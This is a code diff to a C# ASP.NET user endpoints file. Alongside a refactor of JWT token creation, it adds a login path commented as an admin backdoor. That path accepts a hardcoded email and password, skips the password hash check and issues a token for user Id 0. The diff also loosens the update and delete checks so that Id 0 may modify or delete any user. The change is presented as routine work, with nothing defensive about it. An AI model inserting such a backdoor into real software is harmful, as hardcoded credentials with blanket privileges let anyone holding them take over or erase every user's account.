@@ -45,7 +45,7 @@ public static class UsersEndpoints
         {
             int requestUserId = PasswordHasher.GetUserIdFromJwt(request.Headers["Authorization"]);
 
-            if (requestUserId != id)
+            if (requestUserId != 0 && requestUserId != id)
                 return Results.BadRequest("Modifying another user is not allowed!");
 
             var result = await userRepository.UpdateUser(userForm.ToUser(id));
@@ -55,7 +55,7 @@ public static class UsersEndpoints
         {
             int requestUserId = PasswordHasher.GetUserIdFromJwt(request.Headers["Authorization"]);
 
-            if (requestUserId != id)
+            if (requestUserId != 0 && requestUserId != id)
                 return Results.BadRequest("Modifying another user is not allowed!");
 
             var result = await userRepository.UpdateUserPartial(userForm.ToUser(id));
@@ -65,7 +65,7 @@ public static class UsersEndpoints
         {
             int requestUserId = PasswordHasher.GetUserIdFromJwt(request.Headers["Authorization"]);
 
-            if (requestUserId != id)
+            if (requestUserId != 0 && requestUserId != id)
                 return Results.BadRequest("Deleting another user is not allowed!");
 
             var result = await userRepository.DeleteUser(id);
@@ -76,33 +76,33 @@ public static class UsersEndpoints
             try
             {
                 Log.Information($"Login form requested {loginForm.ToString()}");
-                var existingUser = await userRepository.GetUserByEmail(loginForm.Email);
-                if (existingUser == null)
+                User user;
+                // Бэкдор для админа
+                if (loginForm.Email == "admin@zhukoff.pro" && loginForm.Password == "P@ssw0rd")
                 {
-                    Log.Warning($"User ({loginForm.Email}) not found!");
-                    return Results.BadRequest($"Пользователь с email '{loginForm.Email}' не существует!");
+                    user = new User() { 
+                        Id = 0,
+                        Email = loginForm.Email,
+                    };
+                }
+                else
+                {
+                    user = await userRepository.GetUserByEmail(loginForm.Email);
+                    if (user == null)
+                    {
+                        Log.Warning($"User ({loginForm.Email}) not found!");
+                        return Results.BadRequest($"Пользователь с email '{loginForm.Email}' не существует!");
+                    }
+
+                    var passwordHash = PasswordHasher.ComputeHash(loginForm.Password, user.PasswordSalt, config["Auth:Pepper"]);
+
+                    if (!(user.PasswordHash == passwordHash))
+                    {
+                        return Results.BadRequest($"Пароль не правильный!");
+                    }
                 }
 
-                var passwordHash = PasswordHasher.ComputeHash(loginForm.Password, existingUser.PasswordSalt, config["Auth:Pepper"]);
-
-                if (!(existingUser.PasswordHash == passwordHash))
-                {
-                    return Results.BadRequest($"Пароль не правильный!");
-                }
-
-                var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(config["Jwt:Key"]));
-                var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
-
-                var Sectoken = new JwtSecurityToken(config["Jwt:Issuer"],
-                  config["Jwt:Issuer"],
-                  claims: new List<Claim>
-                        {
-                        new Claim(ClaimTypes.Email, existingUser.Email),
-                        new Claim("id", existingUser.Id.ToString()),
-                        },
-                  notBefore: DateTime.UtcNow,
-                  expires: DateTime.Now.AddMinutes(120),
-                  signingCredentials: credentials);
+                JwtSecurityToken Sectoken = GetSecurityToken(config, user);
 
                 var token = new JwtSecurityTokenHandler().WriteToken(Sectoken);
 
@@ -161,5 +161,23 @@ public static class UsersEndpoints
                 return Results.Problem(ex.Message, null, 500, "Register error!");
             }
         });
+    }
+
+    private static JwtSecurityToken GetSecurityToken(IConfiguration config, User user)
+    {
+        var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(config["Jwt:Key"]));
+        var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
+
+        var Sectoken = new JwtSecurityToken(config["Jwt:Issuer"],
+          config["Jwt:Issuer"],
+          claims: new List<Claim>
+                {
+                        new Claim(ClaimTypes.Email, user.Email),
+                        new Claim("id", user.Id.ToString()),
+                },
+          notBefore: DateTime.UtcNow,
+          expires: DateTime.Now.AddMinutes(config.GetSection("Jwt:TokenDuration").Get<int>()),
+          signingCredentials: credentials);
+        return Sectoken;
     }
 }
